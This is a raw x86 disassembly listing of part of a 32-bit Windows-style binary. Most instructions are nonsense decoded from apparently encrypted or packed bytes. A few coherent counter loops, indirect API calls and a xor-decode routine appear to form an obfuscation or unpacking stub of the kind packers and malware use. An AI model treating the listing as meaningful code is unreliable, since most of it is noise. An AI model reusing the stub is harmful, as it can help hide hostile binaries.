  40705e:	in     al,0x1f
  407060:	push   es
  407061:	(bad)  
  407062:	mov    esi,DWORD PTR [esi]
  407064:	xchg   edx,eax
  407065:	sub    ah,BYTE PTR [ecx]
  407067:	nop
  407068:	ins    BYTE PTR es:[edi],dx
  407069:	xchg   BYTE PTR [ebp-0x12],al
  40706c:	jae    0x40709d
  40706e:	xchg   ebp,eax
  40706f:	gs fwait
  407071:	shr    BYTE PTR [edx],1
  407073:	in     al,dx
  407074:	jmp    0x79915c
  407079:	ret    
  40707a:	cli    
  40707b:	std    
  40707c:	jne    0x40705d
  40707e:	pop    eax
  40707f:	pop    ebp
  407080:	or     al,0x65
  407082:	hlt    
  407083:	adc    DWORD PTR ds:0x5375074,0xffffffbf
  40708a:	sbb    DWORD PTR [edi],edi
  40708c:	jg     0x40706f
  40708e:	sub    eax,esi
  407090:	push   ds
  407091:	repnz les eax,FWORD PTR [esi]
  407094:	dec    eax
  407095:	mov    ebp,0xab0623d9
  40709a:	mov    ecx,0x3c6c0fbb
  40709f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070a0:	je     0x40711f
  4070a2:	xchg   ebx,eax
  4070a3:	push   es
  4070a4:	(bad)  
  4070a5:	adc    ah,ah
  4070a7:	loope  0x4070bb
  4070a9:	int3   
  4070aa:	pop    ebx
  4070ab:	mov    esp,0x5b9a229b
  4070b0:	inc    esp
  4070b1:	ins    BYTE PTR es:[edi],dx
  4070b2:	inc    ecx
  4070b3:	add    eax,0x94690e3a
  4070b8:	mov    bh,0xdb
  4070ba:	cmp    cl,BYTE PTR [ecx-0x1da63997]
  4070c0:	xchg   edx,eax
  4070c1:	pop    ebx
  4070c2:	test   BYTE PTR [ecx],bl
  4070c4:	push   0x59591c12
  4070c9:	ficom  WORD PTR [ebx+eax*4+0x5296bbe2]
  4070d0:	or     BYTE PTR [edx+0x62037c57],bl
  4070d6:	or     bh,ah
  4070d8:	xchg   ebx,eax
  4070d9:	mov    BYTE PTR [ebp-0x5fbee8e0],bh
  4070df:	dec    eax
  4070e0:	or     ah,bl
  4070e2:	inc    edx
  4070e3:	sar    DWORD PTR [edi+ecx*1+0x6c6b0243],0x92
  4070eb:	sbb    ecx,esi
  4070ed:	in     al,dx
  4070ee:	repz fdivr st(4),st
  4070f1:	and    BYTE PTR [edx-0x70fb4b15],bh
  4070f7:	or     dl,BYTE PTR [ecx+0x622492bd]
  4070fd:	jne    0x407100
  4070ff:	test   DWORD PTR [edx-0x7d],esi
  407102:	mov    BYTE PTR [ecx-0x3f],ah
  407105:	dec    ebp
  407106:	xor    eax,0x58de8171
  40710b:	mov    edx,0xd95b9fb3
  407110:	or     DWORD PTR ds:0x46edaf70,esp
  407116:	inc    edx
  407117:	sbb    ecx,DWORD PTR [esi+0x2d]
  40711a:	and    esi,DWORD PTR [eax]
  40711c:	fst    DWORD PTR [edi+ecx*1]
  40711f:	sbb    esi,DWORD PTR [edi-0x7c632363]
  407125:	bound  ebp,QWORD PTR [ebx-0x4]
  407128:	jle    0x40716a
  40712a:	jmp    0xa8151be2
  40712f:	add    DWORD PTR [eax+0x51],edi
  407132:	pop    esp
  407133:	inc    ebx
  407134:	adc    dh,BYTE PTR [edi]
  407136:	addr16 aaa 
  407138:	adc    al,al
  40713a:	mov    al,0xcc
  40713c:	lds    edi,FWORD PTR [ebx+0x79]
  40713f:	ins    DWORD PTR es:[edi],dx
  407140:	inc    edi
  407141:	mov    esi,0x8954fd23
  407146:	dec    ebx
  407147:	(bad)  
  407148:	in     al,dx
  407149:	mov    ecx,0xf4c22e4
  40714e:	popf   
  40714f:	leave  
  407150:	pusha  
  407151:	sbb    ecx,edx
  407153:	jno    0x4071bd
  407155:	sbb    eax,0x39f5654e
  40715a:	adc    esi,DWORD PTR [edx+esi*2+0x5b6e638]
  407161:	js     0x40717b
  407163:	jecxz  0x4070fd
  407165:	cmp    eax,0xc94e008e
  40716a:	dec    ecx
  40716b:	push   ss
  40716c:	rol    BYTE PTR [edx],1
  40716e:	or     al,0x53
  407170:	stos   DWORD PTR es:[edi],eax
  407171:	out    dx,eax
  407172:	sub    eax,0x4b946d29
  407177:	add    al,BYTE PTR [edi+0x58f14b7a]
  40717d:	mov    al,0xad
  40717f:	(bad)  
  407180:	xor    DWORD PTR [edi+0x22ec4f17],edx
  407186:	push   esi
  407187:	sahf   
  407188:	mov    DWORD PTR [edi],0x2dd03574
  40718e:	ja     0x407114
  407190:	retf   0x625f
  407193:	mov    al,BYTE PTR ds:0xd6405aec
  407199:	popa   
  40719a:	ret    0x8ea5
  40719d:	push   ecx
  40719e:	push   esi
  40719f:	mov    WORD PTR [eax],?
  4071a1:	mov    es,esi
  4071a3:	out    dx,eax
  4071a4:	sub    eax,0x4e32fc89
  4071a9:	jmp    0x4071b5
  4071ab:	mov    WORD PTR [ebx-0x38],es
  4071ae:	leave  
  4071af:	test   al,0xfd
  4071b1:	dec    edi
  4071b2:	or     esp,DWORD PTR [esi]
  4071b4:	lods   eax,DWORD PTR ds:[esi]
  4071b5:	push   ds
  4071b6:	inc    edx
  4071b7:	sub    DWORD PTR [esi-0x23],eax
  4071ba:	push   0x160bc552
  4071bf:	xlat   BYTE PTR ds:[ebx]
  4071c0:	imul   BYTE PTR [ecx-0x66]
  4071c3:	xchg   BYTE PTR [edi],dl
  4071c5:	and    esp,edi
  4071c7:	jbe    0x407190
  4071c9:	jecxz  0x40716e
  4071cb:	and    ecx,DWORD PTR [ecx-0x59]
  4071ce:	loopne 0x4071b7
  4071d0:	xor    edi,edx
  4071d2:	or     eax,DWORD PTR [ecx]
  4071d4:	(bad)  
  4071d5:	call   0xac699b9a
  4071da:	xchg   ebp,eax
  4071db:	or     al,0x1a
  4071dd:	jo     0x40718f
  4071df:	stos   DWORD PTR es:[edi],eax
  4071e0:	or     bh,ah
  4071e2:	mov    edi,0x7efb39ba
  4071e7:	pop    ds
  4071e8:	iret   
  4071e9:	lods   al,BYTE PTR ds:[esi]
  4071ea:	cmp    ebp,edx
  4071ec:	sub    DWORD PTR [ecx+0x52abc6c4],edx
  4071f2:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071f4:	or     al,0x5c
  4071f6:	test   eax,0x435fbbc4
  4071fb:	imul   ecx,ebx,0x2db9626f
  407201:	xchg   eax,esi
  407203:	mov    cl,0xe6
  407205:	mov    esp,DWORD PTR [edx-0x37]
  407208:	lods   eax,DWORD PTR ds:[esi]
  407209:	push   edx
  40720a:	(bad)  
  40720c:	ja     0x407248
  40720e:	sbb    DWORD PTR [eax-0x9d67e98],eax
  407214:	mov    ah,0x89
  407216:	adc    al,0x87
  407218:	dec    ebx
  407219:	imul   eax,DWORD PTR [ecx],0xa6d953a3
  40721f:	int3   
  407220:	pop    ecx
  407221:	lods   al,BYTE PTR ds:[esi]
  407222:	dec    ebx
  407223:	and    eax,0x5e113757
  407228:	or     ecx,edx
  40722a:	mul    DWORD PTR [edi]
  40722c:	dec    ecx
  40722d:	adc    BYTE PTR [ebx+0x5ee51a4],dh
  407233:	mov    ch,0x51
  407235:	div    DWORD PTR [edi+0x72ec7b7e]
  40723b:	sub    al,cl
  40723d:	xchg   ebp,eax
  40723e:	in     al,0xa9
  407240:	push   cs
  407241:	popf   
  407242:	in     al,dx
  407243:	(bad)  
  407244:	aam    0xaa
  407246:	or     edx,DWORD PTR [ebp+edi*8-0x2950a059]
  40724d:	push   0xb29720f0
  407252:	adc    eax,0x337877a6
  407257:	and    al,0x36
  407259:	aas    
  40725a:	mov    eax,ds:0xd64be1f8
  40725f:	cmc    
  407260:	sub    edx,DWORD PTR [ebx-0x56]
  407263:	sbb    DWORD PTR ds:0xfca3389a,ecx
  407269:	(bad)  
  40726a:	or     eax,0x7197bba2
  40726f:	fs jnp 0x4072a8
  407272:	or     BYTE PTR [edi+0x3e],0x95
  407276:	mov    ah,0xf
  407278:	push   ecx
  407279:	mov    ch,BYTE PTR [ecx]
  40727b:	sti    
  40727c:	push   esp
  40727d:	and    ah,BYTE PTR [eax+0x506fee87]
  407283:	push   esi
  407284:	sbb    al,0xd
  407286:	bound  ebp,QWORD PTR [edx-0x1501537e]
  40728c:	sbb    edx,DWORD PTR [ebp+0x9410b1b]
  407292:	out    dx,al
  407293:	fstp   st(6)
  407295:	jmp    0xee0a:0x51ec76fe
  40729c:	outs   dx,DWORD PTR ds:[esi]
  40729d:	dec    eax
  40729e:	jne    0x40731f
  4072a0:	inc    eax
  4072a1:	and    bh,dl
  4072a3:	shl    al,cl
  4072a5:	ins    DWORD PTR es:[edi],dx
  4072a6:	cld    
  4072a7:	retf   
  4072a8:	mul    BYTE PTR [ecx-0x38]
  4072ab:	push   ss
  4072ac:	sbb    eax,eax
  4072ae:	pop    ss
  4072af:	pop    esp
  4072b0:	mov    ds:0x79dc97cd,al
  4072b5:	icebp  
  4072b6:	push   ebx
  4072b7:	sbb    eax,0x237bab0
  4072bc:	pop    eax
  4072bd:	ficomp DWORD PTR [esi]
  4072bf:	sti    
  4072c0:	add    ebx,ebp
  4072c2:	les    edi,FWORD PTR ds:0x6abb46a0
  4072c8:	daa    
  4072c9:	inc    edx
  4072ca:	or     al,0xab
  4072cc:	jns    0x4072a1
  4072ce:	xchg   esi,eax
  4072cf:	or     BYTE PTR [ebx+0x7],cl
  4072d2:	dec    ecx
  4072d3:	out    0x72,al
  4072d5:	jae    0x4072b9
  4072d7:	or     bh,dh
  4072d9:	inc    ecx
  4072da:	adc    ch,bl
  4072dc:	cmp    eax,0x109ce582
  4072e1:	xor    eax,0x468582be
  4072e6:	add    BYTE PTR [edi+0x3d],bl
  4072e9:	lea    edx,[edi+0xe]
  4072ec:	adc    al,0xa0
  4072ee:	lods   al,BYTE PTR ds:[esi]
  4072ef:	jmp    0xbb98:0x5b3d31f8
  4072f6:	xchg   BYTE PTR [eax+0x39e28549],dl
  4072fc:	dec    esp
  4072fd:	or     BYTE PTR [edi+0x5c483121],bh
  407303:	addr16 daa 
  407305:	lahf   
  407306:	push   ds
  407307:	xor    eax,0xd2aa8c20
  40730c:	inc    ebx
  40730d:	retf   0xe01a
  407310:	pushf  
  407311:	sbb    al,0x94
  407313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407314:	pushf  
  407315:	pop    ss
  407316:	sbb    ah,BYTE PTR [ecx-0x37]
  407319:	aaa    
  40731a:	and    eax,0xcf87d15b
  40731f:	js     0x40731b
  407321:	lods   eax,DWORD PTR ds:[esi]
  407322:	fld    st(6)
  407324:	inc    ebp
  407325:	(bad)  
  407326:	jg     0x4072b5
  407328:	inc    ebp
  407329:	inc    DWORD PTR [ecx+0x42aef925]
  40732f:	add    BYTE PTR [eax],al
  407331:	add    BYTE PTR [eax],al
  407333:	add    cl,ch
  407335:	or     eax,0x8b000000
  40733a:	or     eax,0x42aef9
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42aef9,ecx
  407346:	cmp    DWORD PTR ds:0x42aef9,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42aef9,0x4
  40735a:	jne    0x407378
  407360:	push   0x42b009
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42aef9,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42aef9
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42aef9,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x2964206a,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x407391
  4073b7:	xor    BYTE PTR [ecx-0x67],ch
  4073ba:	and    bl,BYTE PTR [edx]
  4073bc:	push   cs
  4073bd:	sub    esi,0x57
  4073c0:	push   es
  4073c1:	nop
  4073c2:	call   0xfc17:0x69ae90ea
  4073c9:	inc    edi
  4073ca:	out    dx,eax
  4073cb:	or     edx,DWORD PTR [ecx+0x7e]
  4073ce:	sahf   
  4073cf:	jb     0x4073cf
  4073d1:	jg     0x4073f9
  4073d3:	xchg   ebp,eax
  4073d4:	cmovge esi,DWORD PTR [edx]
  4073d7:	popa   
  4073d8:	mov    cl,0x5d
  4073da:	jns    0x40742e
  4073dc:	lea    edi,[ebp+0x2f7f77af]
  4073e2:	retf   0x6e49
  4073e5:	arpl   WORD PTR [esi+ebx*1],cx
  4073e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073e9:	jno    0x4073bd
  4073eb:	retf   0x9238
  4073ee:	and    al,0x53
  4073f0:	adc    BYTE PTR [edx+0xe],ah
  4073f3:	(bad)
  4073f6:	scas   eax,DWORD PTR es:[edi]
  4073f7:	repz popf 
  4073f9:	mov    dl,0xa0
  4073fb:	imul   esi,DWORD PTR [ecx-0x2de6a0c5],0xffffffe9
  407402:	shl    dl,1
  407404:	fst    QWORD PTR [edx-0x56]
  407407:	xor    esp,DWORD PTR [edx+eiz*4+0x13]
  40740b:	cli    
  40740c:	(bad)  
  40740d:	pop    ebx
  40740e:	or     DWORD PTR [ebx+0x44869cce],0x4c
  407415:	inc    ecx
  407416:	push   esi
  407417:	adc    eax,0x17874150
  40741c:	push   esp
  40741d:	test   esp,edi
  40741f:	rol    BYTE PTR [esi+eiz*4+0x5ab7d143],cl
  407426:	loop   0x4073ab
  407428:	sbb    DWORD PTR [ebx-0x65],0xfa5f608c
  40742f:	rcl    DWORD PTR [ebx],1
  407431:	push   ds
  407432:	dec    esi
  407433:	ss jno 0x40744b
  407436:	(bad)  
  407437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407438:	ret    0x5990
  40743b:	mov    ebp,0x272c6cdc
  407440:	inc    edi
  407441:	adc    ebp,ecx
  407443:	mov    al,ds:0x8ba43682
  407448:	adc    DWORD PTR [eax+0x2ef2fe7e],edx
  40744e:	ret    0xc82
  407451:	xchg   BYTE PTR [esi+0x7a4c088e],dh
  407457:	mov    al,0x26
  407459:	jmp    0x4074b5
  40745b:	iret   
  40745c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40745d:	rcl    DWORD PTR [ebp-0x457575a1],1
  407463:	jge    0x407468
  407465:	sub    ah,dh
  407467:	add    ebp,DWORD PTR [edx+0x555781f]
  40746d:	cdq    
  40746e:	jae    0x4074c4
  407470:	jle    0x40747d
  407472:	ret    0x3322
  407475:	or     eax,0x64c2d666
  40747a:	popf   
  40747b:	ins    DWORD PTR es:[edi],dx
  40747c:	fucomi st,st(7)
  40747e:	(bad)  
  407480:	sbb    eax,0xe9f51f62
  407485:	(bad)  
  407486:	mov    al,0x5f
  407488:	ss shl ebx,0x50
  40748c:	dec    ebx
  40748d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40748e:	dec    edi
  40748f:	loope  0x40745f
  407491:	rcl    DWORD PTR [eax+0x75],1
  407494:	and    al,0xb7
  407496:	retf   0x8b20
  407499:	(bad)  
  40749a:	jle    0x4074c3
  40749c:	inc    ebp
  40749d:	sub    BYTE PTR [edx-0x40],bl
  4074a0:	(bad)  
  4074a1:	int3   
  4074a2:	arpl   dx,si
  4074a4:	mov    eax,ds:0xd7fcfff0
  4074a9:	daa    
  4074aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074ab:	push   ebx
  4074ac:	mov    eax,0xa99a16f8
  4074b1:	xchg   edi,eax
  4074b2:	adc    esp,ebx
  4074b4:	lods   al,BYTE PTR ds:[esi]
  4074b5:	sti    
  4074b6:	adc    DWORD PTR [ecx+0x3],eax
  4074b9:	or     eax,0xad8c93e4
  4074be:	xor    edi,DWORD PTR [edi-0x60]
  4074c1:	dec    ebx
  4074c2:	leave  
  4074c3:	sub    ah,ah
  4074c5:	aaa    
  4074c6:	push   0x8b51a404
  4074cb:	push   es
  4074cc:	call   0xb57c:0x3d0df88e
  4074d3:	imul   ebx,DWORD PTR [esi],0x682d0f6
  4074d9:	cdq    
  4074da:	push   esp
  4074db:	pusha  
  4074dc:	aam    0xf8
  4074de:	nop
  4074df:	xchg   esp,eax
  4074e0:	(bad)  
  4074e2:	and    BYTE PTR [ecx],bl
  4074e4:	or     eax,DWORD PTR [ecx-0x7c3fb34e]
  4074ea:	mov    bl,0xdc
  4074ec:	mov    bl,0x5a
  4074ee:	nop
  4074ef:	(bad)  
  4074f0:	popf   
  4074f1:	fisttp QWORD PTR [ebx-0x52b55aa7]
  4074f7:	fwait
  4074f8:	aam    0xf7
  4074fa:	mov    dh,0x6f
  4074fc:	(bad)  
  4074fd:	repz shl DWORD PTR [ebp-0x63],1
  407501:	(bad)  
  407502:	ret    0xefe1
  407505:	jl     0x40750a
  407507:	mov    bl,0x24
  407509:	pop    ecx
  40750a:	add    esp,DWORD PTR [esi+0x3c10eb3]
  407510:	icebp  
  407511:	push   es
  407512:	jge    0x40750b
  407514:	xlat   BYTE PTR ds:[bx]
  407516:	or     BYTE PTR [esi-0x3010e709],0xa9
  40751d:	daa    
  40751e:	mov    ebp,0xe95f01e0
  407523:	push   es
  407524:	mov    eax,ds:0xfe51f932
  407529:	call   0x324:0xea53d7a8
  407530:	sub    BYTE PTR [esi+eiz*4],ch
  407533:	inc    edx
  407534:	xchg   esp,eax
  407535:	mov    al,ds:0x4775d7f7
  40753a:	add    eax,0xf5646c88
  40753f:	cld    
  407540:	jns    0x407507
  407542:	jmp    0x407506
  407544:	repz add al,0x2f
  407547:	sbb    edx,DWORD PTR [edx+ebp*1-0x5b6da62f]
  40754e:	imul   edx,DWORD PTR ds:0x55ad7401,0x9a6a06a9
  407558:	mov    ds,WORD PTR [ebx]
  40755a:	and    al,0x8f
  40755c:	mov    eax,eax
  40755e:	jnp    0x4075c0
  407560:	aaa    
  407561:	mov    ah,0x67
  407563:	mov    ebx,0xde5d1e4a
  407568:	cli    
  407569:	dec    esp
  40756a:	mov    dl,0x3e
  40756c:	(bad)  
  40756d:	fidivr WORD PTR [edx-0x5ce95ab4]
  407573:	and    dl,BYTE PTR [edi]
  407575:	inc    esi
  407576:	add    DWORD PTR [edx],edx
  407578:	xchg   ebp,eax
  407579:	sbb    BYTE PTR [edi+0x1],0xa8
  40757d:	repz adc al,0xcc
  407580:	xchg   esi,eax
  407581:	dec    ecx
  407582:	repnz daa 
  407584:	popa   
  407585:	sti    
  407586:	xor    BYTE PTR [esi-0x1a0ae5ea],dl
  40758c:	xchg   ebp,eax
  40758d:	leave  
  40758e:	adc    DWORD PTR [eax+0x0],edx
  407591:	inc    eax
  407592:	mov    cl,0x60
  407594:	xlat   BYTE PTR ds:[ebx]
  407595:	loope  0x4075c7
  407597:	in     al,0x9e
  407599:	mov    BYTE PTR [ebx],ch
  40759b:	add    BYTE PTR [eax-0x19],dl
  40759e:	add    cl,BYTE PTR [esi]
  4075a0:	pop    eax
  4075a1:	mov    esi,0x1c6e9fe8
  4075a6:	inc    edi
  4075a7:	and    eax,0xa8d0abcc
  4075ac:	es jne 0x4075b2
  4075af:	das    
  4075b0:	imul   ebx,eax,0x13e19d4f
  4075b6:	xchg   esi,eax
  4075b7:	mov    ?,WORD PTR [edx+0x1]
  4075ba:	and    eax,0xc11aac52
  4075bf:	mov    ?,WORD PTR [ebp+0x10]
  4075c2:	pop    esi
  4075c3:	add    bl,cl
  4075c5:	mov    esi,0x40b3ee7a
  4075ca:	fisub  DWORD PTR [ebx+0x28661f71]
  4075d0:	pop    esp
  4075d1:	mov    edi,0xd5cfee9d
  4075d6:	les    esi,FWORD PTR [eax+edi*4-0x68]
  4075da:	pop    ds
  4075db:	dec    ebx
  4075dc:	jnp    0x40758d
  4075de:	inc    ecx
  4075df:	loopne 0x4075e8
  4075e1:	cmp    eax,0x5bee2e46
  4075e6:	(bad)  
  4075e7:	ja     0x407656
  4075e9:	jnp    0x4075af
  4075eb:	mov    esp,0x6f6716f7
  4075f0:	dec    ebx
  4075f1:	shl    ebp,1
  4075f3:	inc    esp
  4075f4:	mov    ecx,0x29e163c3
  4075f9:	leave  
  4075fa:	imul   ebx,DWORD PTR [eax+0x194adeea],0x1f79890
  407604:	dec    esi
  407605:	icebp  
  407606:	push   eax
  407607:	push   ebx
  407608:	mov    ah,0xb1
  40760a:	retf   0x3691
  40760d:	cmovp  edi,DWORD PTR [ecx-0x18]
  407611:	jmp    0xb6d5d343
  407616:	pushf  
  407617:	inc    esp
  407618:	xchg   ebp,eax
  407619:	or     BYTE PTR [ebp+0x2c0993c],bl
  40761f:	(bad)
  407622:	mov    edx,0xc5461f68
  407627:	aas    
  407628:	dec    eax
  407629:	cdq    
  40762a:	and    esi,DWORD PTR [ebx-0x72]
  40762d:	xor    eax,0xd26d001c
  407632:	imul   edi,edi,0x4
  407635:	cmp    BYTE PTR [edi+0x578fb53d],al
  40763b:	test   ebx,ecx
  40763d:	lock mov bh,0x38
  407640:	(bad)  
  407641:	sbb    esi,edx
  407643:	add    ebp,ebp
  407645:	xchg   DWORD PTR [ebx-0x917f143],eax
  40764b:	js     0x40766c
  40764d:	sti    
  40764e:	jge    0x407607
  407650:	push   edi
  407651:	xchg   edx,eax
  407652:	jle    0x407644
  407654:	xor    BYTE PTR [ebx+edi*4-0x7f790e36],dh
  40765b:	inc    ebp
  40765c:	popa   
  40765d:	adc    esp,DWORD PTR ds:0x6917f8e7
  407663:	ret    
  407664:	test   BYTE PTR [eax],dh
  407666:	push   ss
  407667:	pop    ds
  407668:	sar    BYTE PTR [ebx+0x10],1
  40766b:	xchg   edx,eax
  40766c:	cdq    
  40766d:	repz mov ebp,0x2f4d48c0
  407673:	and    eax,0x3f6f651c
  407678:	js     0x4076f2
  40767a:	and    dl,0xf2
  40767d:	xchg   ebp,eax
  40767e:	ret    0xccc6
  407681:	fld    TBYTE PTR [esi+ecx*2+0x6d110b7d]
  407688:	dec    esi
  407689:	xor    al,0x6e
  40768b:	adc    BYTE PTR [ebp+0x3a249d93],0xc8
  407692:	dec    edi
  407693:	sub    eax,0xbe8a6e95
  407698:	fst    st(7)
  40769a:	mov    ebp,0x80499d0e
  40769f:	mov    ds:0x45896088,eax
  4076a4:	lock mov al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42aee1,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42afbd,0x42aefd
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42af39,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42af39
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42af39,ecx
  4076e8:	cmp    DWORD PTR ds:0x42af39,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42af39,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42af39,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42af39
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42af39,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx+0x3ae76e8],1
  407796:	arpl   WORD PTR ds:[ecx],ax
  407799:	mov    al,0xd6
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x4077f8
  4077a2:	sub    al,0xee
  4077a4:	daa    
  4077a5:	push   0x4
  4077a7:	sub    edx,DWORD PTR [edx+0xf08e59a]
  4077ad:	and    DWORD PTR [ecx+0x16],ebx
  4077b0:	cdq    
  4077b1:	cwde   
  4077b2:	push   ecx
  4077b3:	mov    ebx,0x38a04217
  4077b8:	mov    cl,0x88
  4077ba:	popa   
  4077bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077bc:	dec    esi
  4077bd:	mov    dl,0xa0
  4077bf:	std    
  4077c0:	bound  eax,QWORD PTR [eax]
  4077c2:	aas    
  4077c3:	adc    eax,0x9587741
  4077c8:	push   edx
  4077c9:	lds    edx,FWORD PTR [edi+0x2800f0cb]
  4077cf:	int    0xa
  4077d1:	add    ah,BYTE PTR [eax-0x27]
  4077d4:	mov    edi,DWORD PTR [edx-0x5f]
  4077d7:	inc    ecx
  4077d8:	in     al,dx
  4077d9:	jle    0x407811
  4077db:	scas   eax,DWORD PTR es:[edi]
  4077dc:	fdivr  st,st(3)
  4077de:	jno    0x4077da
  4077e0:	mov    al,BYTE PTR [eax]
  4077e2:	hlt    
  4077e3:	(bad)  
  4077e4:	sub    esi,DWORD PTR [edi+0x34179a73]
  4077ea:	push   eax
  4077eb:	scas   al,BYTE PTR es:[edi]
  4077ec:	mov    al,ds:0x1bf1daa3
  4077f1:	mov    esp,0x8b079195
  4077f6:	aaa    
  4077f7:	test   ecx,edx
  4077f9:	mov    ecx,esi
  4077fb:	mov    DWORD PTR [edx+0x31],edi
  4077fe:	ret    
  4077ff:	retf   
  407800:	aam    0x5f
  407802:	push   ebp
  407803:	in     eax,0x24
  407805:	dec    edx
  407806:	sti    
  407807:	dec    eax
  407808:	loop   0x40786e
  40780a:	mov    eax,edi
  40780c:	pop    es
  40780d:	loopne 0x407822
  40780f:	icebp  
  407810:	fwait
  407811:	aam    0x1e
  407813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407814:	sub    ebx,0x27240009
  40781a:	xchg   BYTE PTR [eax],ch
  40781c:	jmp    0x4077d5
  40781e:	mov    bh,0xa1
  407820:	fmulp  st(7),st
  407822:	aam    0x70
  407824:	aas    
  407825:	sbb    bl,BYTE PTR [edi]
  407827:	ss mov BYTE PTR gs:0x3d5274e5,bh
  40782f:	call   0xcc9e0fc6
  407834:	jns    0x4077d2
  407836:	lods   eax,DWORD PTR ds:[esi]
  407837:	mov    esp,0xcc0e909a
  40783c:	das    
  40783d:	lods   al,BYTE PTR ds:[esi]
  40783e:	or     DWORD PTR [ebp-0x3506d471],esi
  407844:	add    al,0xfd
  407846:	out    dx,eax
  407847:	sub    al,0x69
  407849:	adc    eax,0x4edfa972
  40784e:	rol    DWORD PTR [esi-0x306ae70],0x45
  407855:	push   edx
  407856:	mov    ah,0xb
  407858:	mov    al,0xe8
  40785a:	je     0x407880
  40785c:	xchg   esp,eax
  40785d:	test   DWORD PTR [eax+ecx*1],ebp
  407860:	mov    eax,0xd9159391
  407865:	icebp  
  407866:	mov    ch,0x7f
  407868:	int    0xad
  40786a:	stos   BYTE PTR es:[edi],al
  40786b:	jne    0x407808
  40786d:	jae    0x4078bc
  40786f:	push   ebx
  407870:	pop    esi
  407871:	stos   BYTE PTR es:[edi],al
  407872:	dec    ebx
  407873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407874:	cmp    ebp,eax
  407876:	sub    eax,0x2f9b6f05
  40787b:	cmp    al,0x1e
  40787d:	jne    0x407819
  40787f:	(bad)  
  407880:	fiadd  DWORD PTR [ebp-0x1d]
  407883:	adc    ebx,DWORD PTR [ecx]
  407885:	dec    esi
  407886:	dec    ebx
  407887:	(bad)  [ebx-0x1b]
  40788a:	ds and esp,eax
  40788d:	mov    WORD PTR [esi],gs
  40788f:	std    
  407890:	ins    DWORD PTR es:[edi],dx
  407891:	xchg   edx,eax
  407892:	pop    edi
  407893:	ret    
  407894:	mov    eax,ds:0xe62ebf8
  407899:	out    dx,al
  40789a:	jmp    0x63f8:0x7430592f
  4078a1:	sahf   
  4078a2:	sub    eax,0x4cc13082
  4078a7:	adc    eax,eax
  4078a9:	mov    DWORD PTR [esi],edx
  4078ab:	xchg   esp,eax
  4078ac:	aam    0x4b
  4078ae:	icebp  
  4078af:	adc    DWORD PTR [edi],ecx
  4078b1:	xchg   edi,eax
  4078b2:	pop    esp
  4078b3:	mov    WORD PTR [ebx+0x45],?
  4078b6:	lock leave 
  4078b8:	scas   al,BYTE PTR es:[edi]
  4078b9:	adc    al,0x5b
  4078bb:	(bad)  
  4078bc:	aam    0x5c
  4078be:	mov    dl,0x2b
  4078c0:	and    dh,BYTE PTR [esi]
  4078c2:	mov    gs,eax
  4078c4:	mov    eax,ds:0x9bd001d1
